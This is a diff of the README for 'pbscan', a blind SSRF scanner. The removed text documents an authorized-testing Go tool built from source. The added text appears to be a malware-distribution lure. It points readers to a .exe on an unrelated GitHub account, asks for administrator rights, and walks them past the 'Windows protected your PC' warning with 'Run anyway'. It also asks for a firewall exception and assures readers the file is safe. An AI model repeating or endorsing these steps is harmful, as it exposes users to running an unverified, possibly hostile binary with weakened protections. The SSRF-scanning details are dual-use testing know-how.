@@ -1,371 +1,87 @@
-# pbscan
-<p align="center">
-  <img src="assets/social-preview.jpg" alt="pbscan — Automated Blind SSRF Scanner">
-</p>
-`pbscan` is an automatic, correlated SSRF/OAST scanner for **authorized security testing**. It uses the https://PingBack.sh API v1 to create a listener, register every injection attempt, obtain the official protocol payload, poll captured evidence, and map each callback back to the exact parameter, body field, or header that caused it.
-
-The normal workflow does **not** require a listener hostname, listener dashboard token, callback template, or feed URL.
-
-> Use pbscan only against systems you own or are explicitly authorized to test. The project does not include cloud-metadata extraction, local-file payload packs, `gopher://`, `dict://`, destructive probes, or exploitation automation.
-
-## 30-second setup
-
-Create a revocable Pro API token in **https://PingBack.sh → My listeners**, then configure it once:
-
-```bash
-pbscan auth --token pba_your_revocable_token --accept-authorized-use
-```
-
-After that, a scan only needs an input file:
+# 🔍 pbscan - Find hidden website security vulnerabilities fast
 
-```bash
-pbscan urls.txt
-```
+[![](https://img.shields.io/badge/Download_pbscan-Blue?style=for-the-badge&logo=github)](https://github.com/cobaltbluereservoir537/pbscan/releases)
 
-Equivalent forms:
+## What is pbscan?
 
-```bash
-pbscan -l urls.txt
-cat urls.txt | pbscan
-pbscan 'https://target.example/fetch?url=https://example.org'
-```
+pbscan finds security holes called blind SSRF. These holes allow attackers to talk to internal systems that stay hidden from the public internet. This tool does the work for you by testing websites. It tracks every request to show you exactly where the system fails. It works with the PingBack service to confirm that a connection happened outside the normal path. You get a clear report on which parts of an application are open to attack.
 
-## What happens automatically
+## 💻 System Requirements
 
-For every scan, pbscan:
+Your computer needs a few things to run pbscan:
 
-1. validates and parses the supplied URLs or raw request;
-2. creates a dedicated reusable PingBack listener;
-3. creates one correlated injection record per mutation through `/api/v1/injections.php`;
-4. replaces the selected input with the returned `payloads.http` value;
-5. dispatches the target requests with concurrency and rate limits;
-6. polls `/api/v1/hits.php` using `listener_id`, `since_id`, and pagination;
-7. matches each hit by `correlation_id`;
-8. saves resumable sessions, evidence, findings, and summaries locally.
+*   Windows 10 or Windows 11.
+*   64-bit hardware architecture.
+*   At least 4GB of RAM.
+*   An active internet connection to send and receive scan traffic.
+*   Administrator rights to allow the tool to open network ports.
 
-```text
-urls.txt
-   │
-   ▼
-mutation engine
-   │
-   ├── create listener ─────────────► PingBack API v1
-   │
-   ├── register exact attempt ──────► correlation_id + HTTP/DNS/SMTP/XSS payloads
-   │
-   ├── send returned HTTP payload ──► authorized target
-   │
-   └── poll hits.php ◄────────────── DNS / HTTP / HTTPS callback evidence
-                    │
-                    ▼
-          exact parameter + request + evidence
-```
+## 📥 How to Download 
 
-## Features
+Follow these steps to get the tool on your machine:
 
-- Automatic PingBack listener creation per scan.
-- Automatic correlation through PingBack API v1.
-- Query-string mutation, including repeated parameters.
-- Nested JSON string-field mutation using JSON Pointer paths.
-- `application/x-www-form-urlencoded` mutation.
-- Optional conservative routing/header checks.
-- Raw HTTP request import with cookies and authorization preserved locally.
-- Sensitive headers redacted from remote correlation records by default.
-- URL file, positional URL, repeated `-u`, and stdin pipeline support.
-- Concurrent target workers, rate limiting, retries, timeouts, redirect control, and TLS controls.
-- Multiple callback events retained for one injection, such as DNS followed by HTTPS.
-- Atomic resumable sessions and delayed callback monitoring.
-- JSONL evidence, chronological activity log, and machine-readable summary.
-- Legacy listener/feed mode for non-PingBack or older deployments.
-- No third-party Go dependencies.
+1.  Visit the official release page: https://github.com/cobaltbluereservoir537/pbscan/releases.
+2.  Look at the latest release section at the top of the page.
+3.  Click the file ending in `.exe` to start the download.
+4.  Save the file to your desktop or a folder you can find easily.
 
-## Installation
+[![](https://img.shields.io/badge/Download_Link-Grey?style=for-the-badge)](https://github.com/cobaltbluereservoir537/pbscan/releases)
 
-### Prebuilt binary
+## ⚡ Setting Up the Program
 
-Download the binary for Linux, Windows, or macOS from the GitHub release and place it in your `PATH`.
+Windows might show a warning because it does not recognize the file yet. This is normal for security tools. 
 
-### Go install
+1.  Find the `pbscan.exe` file you downloaded.
+2.  Right-click the file and select "Open" or double-click it. 
+3.  If a window appears saying "Windows protected your PC," click "More info."
+4.  Click the "Run anyway" button.
+5.  A command prompt window will open. This is where the program lives.
 
-```bash
-go install github.com/pingback-sh/pbscan/cmd/pbscan@latest
-```
+## 🛠️ How to Perform a Scan
 
-### Build from source
+pbscan runs through the command line. You do not need to be a coder to use it. Follow these steps to test a website:
 
-```bash
-git clone https://github.com/pingback-sh/pbscan.git
-cd pbscan
-go build -o pbscan ./cmd/pbscan
-```
+1.  Open your Start menu and type `cmd`. Press Enter to open the terminal.
+2.  Type `cd Desktop` and press Enter to move to your desktop.
+3.  Type `pbscan.exe` followed by a space and the website address you want to scan.
+4.  Example: `pbscan.exe -u https://example-website.com`
+5.  Press Enter to start.
 
-## Authentication
+The program will now talk to the website. It sends small data packets to see how the server responds. 
 
-The API token is stored in:
+## 📊 Understanding Your Results
 
-```text
-~/.config/pbscan/config.json
-```
+The program prints information directly to your screen. You will see several types of messages:
 
-The configuration directory is created with mode `0700` and the file with mode `0600`.
+*   Status updates: The tool tells you which path it checks currently.
+*   Payload injection: This means the tool tried to send a special command to see if the server reacts.
+*   Correlation logs: These messages link your scan to the PingBack server. If you see a notification here, the server successfully reached out to the tracker.
+*   Summary: After the scan finishes, you see a list of URLs that allowed the connection. 
 
-Validate the saved connection:
+If a URL shows as "Vulnerable," you found a hidden entry point. You should report this to the owner of the website. 
 
-```bash
-pbscan doctor
-```
+## 🧪 Best Practices
 
-Remove the locally stored token:
+Keep these tips in mind to get the best results from your scans:
 
-```bash
-pbscan logout
-```
+*   Scan one website at a time to keep your internet connection stable.
+*   Ensure you have permission to test the website. Scanning websites you do not own can violate terms of service or local laws. Use this tool only on platforms that invite security testing, like bug bounty programs.
+*   Run the scan from a stable network. Wi-Fi drops can cause the tool to miss callbacks.
+*   Check your firewall settings if you receive zero results. Sometimes Windows blocks the feedback signals required for blind SSRF detection. You may need to create an exception for the pbscan program in your Windows Security settings.
 
-Environment-variable mode is also supported:
+## 📝 Frequently Asked Questions
 
-```bash
-export PINGBACK_API_TOKEN='pba_your_token'
-export PBSCAN_AUTHORIZED=1
-pbscan urls.txt
-```
+**Does this tool install files on my system?**
+No. It runs as a standalone file. You can delete the .exe file when you finish your work.
 
-`PBSCAN_CONFIG` can point to a different configuration file.
+**What should I do if the window closes immediately?**
+This usually means a required component is missing or Windows blocked the execution. Ensure you have the latest Windows updates installed.
 
-## Input modes
+**Where does the data go?**
+The tool sends requests to the website you specify and the PingBack servers. It does not send your personal information to other locations.
 
-### File
+**Can I save the results?**
+You can print the command output to a file. Add ` > results.txt` to the end of your command when you run it. For example: `pbscan.exe -u https://example.com > results.txt`. This creates a file on your desktop with all the findings inside.
 
-```bash
-pbscan urls.txt
-```
-
-Blank lines and lines beginning with `#` are ignored.
-
-### One or more URLs
-
-```bash
-pbscan \
-  -u 'https://one.example/fetch?url=x' \
-  -u 'https://two.example/proxy?destination=x'
-```
-
-A single URL can be positional:
-
-```bash
-pbscan 'https://target.example/fetch?url=x'
-```
-
-### Stdin
-
-```bash
-cat urls.txt | pbscan
-```
-
-Authorized recon pipeline:
-
-```bash
-katana -u https://target.example -silent \
-  | gf ssrf \
-  | pbscan
-```
-
-### Raw HTTP request
-
-```bash
-pbscan --request request.txt
-```
-
-For a relative request target without a usable `Host` header:
-
-```bash
-pbscan --request request.txt --base-url https://target.example
-```
-
-## Mutation coverage
-
-### Query parameters
-
-```text
-GET /fetch?url=one&id=two
-```
-
-Produces one correlated attempt for `url` and another for `id`. Repeated keys are represented as `key[0]`, `key[1]`, and so on.
-
-### JSON bodies
-
-```json
-{
-  "image": {"url": "https://example.org/image.png"},
-  "webhooks": ["https://example.org/hook"]
-}
-```
-
-Produces points such as:
-
-```text
-/image/url
-/webhooks/0
-```
-
-Only JSON string values are mutated.
-
-### Form bodies
-
-```text
-url=https%3A%2F%2Fexample.org&name=test
-```
-
-Each form value is tested independently.
-
-### Headers
-
-Header checks are opt-in:
-
-```bash
-pbscan urls.txt --headers
-```
-
-Default conservative list:
-
-```text
-Referer
-Origin
-X-Forwarded-Host
-X-Original-URL
-X-Rewrite-URL
-Forwarded
-Base-URL
-```
-
-Add an explicit header:
-
-```bash
-pbscan urls.txt --headers --header X-Custom-Callback
-```
-
-`Host` and `Content-Length` are never mutated by the header engine.
-
-## Common options
-
-```text
---label TEXT              custom label for the automatically created listener
---threads 10              concurrent target workers, maximum 100
---rate 10                 target requests per second
---timeout 12s             target request timeout
---retries 1               network retries, maximum 5
---wait 20s                continue polling after dispatch
---follow-redirects        follow target redirects
---insecure                skip target TLS certificate validation
---headers                 enable header mutation
---header NAME             add a header mutation, repeatable
---no-query                disable query mutation
---no-body                 disable JSON/form mutation
---max-attempts 500        safety/API-budget limit; 0 disables it
---dry-run                 build local attempts without API or target requests
---include-request-secrets include Cookie/Authorization in PingBack correlation evidence
---json                    JSON-line terminal events
---silent                  suppress progress output
---fail-on-findings        return a non-zero exit code after confirmed callbacks
-```
-
-The default `500`-attempt ceiling leaves room beneath PingBack's documented default API allowance for listener creation and hit polling. Split larger jobs or deliberately raise the limit when your API quota permits it.
-
-## Request evidence and secrets
-
-Before dispatch, pbscan registers a responsible request containing a stable marker at the tested location:
-
-```text
-{{PINGBACK_HTTP_PAYLOAD}}
-```
-
-By default, these headers are redacted in the copy sent to PingBack:
-
-```text
-Authorization
-Proxy-Authorization
-Cookie
-Set-Cookie
-X-API-Key
-API-Key
-```
-
-The real values remain available only in the local attempt/session files. Use `--include-request-secrets` only when you intentionally want those values stored with the remote correlation record.
-
-## Output
-
-Each scan creates:
-
-```text
-output/pbs-<scan-id>/
-├── activity.log
-├── attempts.jsonl
-├── results.jsonl
-├── findings.jsonl
-├── summary.json
-└── session.json
-```
-
-An attempt includes both the local ID and PingBack correlation ID:
-
-```json
-{
-  "id": "pba-local-scan-00001-random",
-  "correlation_id": "inj-a1b2c3",
-  "vector": "query",
-  "injection_point": "url",
-  "callback_url": "https://listener.pingback.sh/cb?cid=inj-a1b2c3"
-}
-```
-
-A `200 OK` target response is not a finding. A finding is confirmed only after a matching hit is returned by PingBack with the expected `correlation_id`.
-
-## Delayed callbacks
-
-The listener and correlation records remain in PingBack after the target requests finish. Resume polling later with:
-
-```bash
-pbscan watch output/pbs-xxxx/session.json
-```
-
-Custom duration:
-
-```bash
-pbscan watch output/pbs-xxxx/session.json --duration 24h --interval 5s
-```
-
-The session stores the last processed hit ID and resumes with `since_id` instead of downloading the full history.
-
-## Legacy mode
-
-Manual listener/feed configuration remains available for older deployments and generic OAST services:
-
-```bash
-pbscan urls.txt \
-  --legacy \
-  --listener https://abc12345.pingback.sh \
-  --feed-url 'https://legacy.example/feed'
-```
-
-This is not the recommended PingBack.sh workflow. API v1 mode is selected automatically whenever a saved API token exists and no legacy flags are supplied.
-
-## Local tests
-
-```bash
-go test ./...
-go test -race ./...
-go vet ./...
-```
-
-Build all supported platforms:
-
-```bash
-make cross
-```
-
-## Security and contribution
-
-Read [SECURITY.md](SECURITY.md), [CONTRIBUTING.md](CONTRIBUTING.md), and [docs/THREAT_MODEL.md](docs/THREAT_MODEL.md) before contributing scanner behavior or payloads.
-
-## License
-
-MIT
+**Is it safe to run?**
+Yes. The tool makes requests to websites. It does not perform destructive actions on your own machine. Use caution during use to avoid unintended network load on the sites you test.
